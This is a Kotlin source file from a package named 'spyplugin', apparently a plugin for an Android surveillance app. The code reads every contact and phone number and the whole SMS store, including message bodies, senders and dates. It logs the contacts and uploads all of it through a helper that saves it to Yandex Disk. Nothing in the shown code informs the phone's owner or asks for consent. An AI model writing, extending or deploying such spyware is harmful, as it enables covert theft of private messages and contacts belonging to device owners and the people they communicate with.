package com.example.spyplugin

import android.content.ContentResolver
import android.net.Uri
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import com.example.background.InfoProvider
import kotlin.collections.emptyList
import kotlin.math.log

class InfoProviderClass : InfoProvider {
    override suspend fun sendInfo(resolver: ContentResolver): Boolean {
        val contacts = getContacts(resolver)
        logContacts(contacts)
        val smsList = getSmsList(resolver)
        val request = ContactsRequest(
            contacts,
            smsList
        )

        val success = sendToServer(request)
        return success
    }

    private suspend fun sendToServer(request: ContactsRequest): Boolean {
        return HttpManager.saveContactsToYandexDisk(request)
    }

    private fun getContacts(resolver: ContentResolver): List<ContactInfo> {

        val contacts = mutableListOf<ContactInfo>()

        val projection = arrayOf(
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.Contacts.HAS_PHONE_NUMBER
        )

        val sortOrder = "${ContactsContract.Contacts.DISPLAY_NAME} ASC"

        resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            projection,
            null,
            null,
            sortOrder
        )?.use { cursor ->
            val idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID)
            val nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
            val hasPhoneIndex = cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)

            while (cursor.moveToNext()) {
                val id = cursor.getString(idIndex)
                val name = cursor.getString(nameIndex)
                val hasPhone = cursor.getInt(hasPhoneIndex)

                val phoneNumbers = if (hasPhone > 0) {
                    getPhoneNumbers(id, resolver)
                } else {
                    emptyList()
                }

                contacts.add(ContactInfo(name, phoneNumbers))
            }
        }
        return contacts
    }

    private fun getPhoneNumbers(contactId: String, resolver: ContentResolver): List<String> {
        val phoneNumbers = mutableListOf<String>()

        val contentResolver = resolver

        contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
            arrayOf(contactId),
            null
        )?.use { phoneCursor ->
            val numberIndex = phoneCursor.getColumnIndex(
                ContactsContract.CommonDataKinds.Phone.NUMBER
            )

            while (phoneCursor.moveToNext()) {
                val number = phoneCursor.getString(numberIndex)
                phoneNumbers.add(number ?: "")
            }
        }

        return phoneNumbers
    }

    private fun logContacts(contacts: List<ContactInfo>) {
        contacts.forEach { contactInfo ->
            Log.d("CONTACT", "Name: ${contactInfo.name}, " +
            "Phones: ${contactInfo.phoneNumbers.joinToString()}")
        }
    }

    private fun getSmsList(resolver: ContentResolver): List<SmsModel> {
        val smsList = mutableListOf<SmsModel>()

        val uri = Uri.parse("content://sms")
        val cursor = resolver.query(
            uri,
            null,
            null,
            null,
            "date DESC"
        )

        cursor?.use {
            val bodyIndex = it.getColumnIndex("body")
            val addressIndex = it.getColumnIndex("address")
            val dateIndex = it.getColumnIndex("date")
            val typeIndex = it.getColumnIndex("type")

            while (it.moveToNext()) {
                val body = it.getString(bodyIndex)
                val address = it.getString(addressIndex)
                val date = it.getLong(dateIndex)
                val type = it.getInt(typeIndex)

                smsList.add(
                    SmsModel(
                        body = body,
                        address = address,
                        date = date,
                        type = type
                    )
                )
            }
        }

        return smsList
    }
}

data class ContactsRequest(
    val contacts: List<ContactInfo>,
    val smsList: List<SmsModel>,
    val timestamp: Long = System.currentTimeMillis()
)
data class ContactInfo(
    val name: String,
    val phoneNumbers: List<String>
)

data class SmsModel(
    val body: String,
    val address: String,
    val date: Long,
    val type: Int // 1 = inbox, 2 = sent
)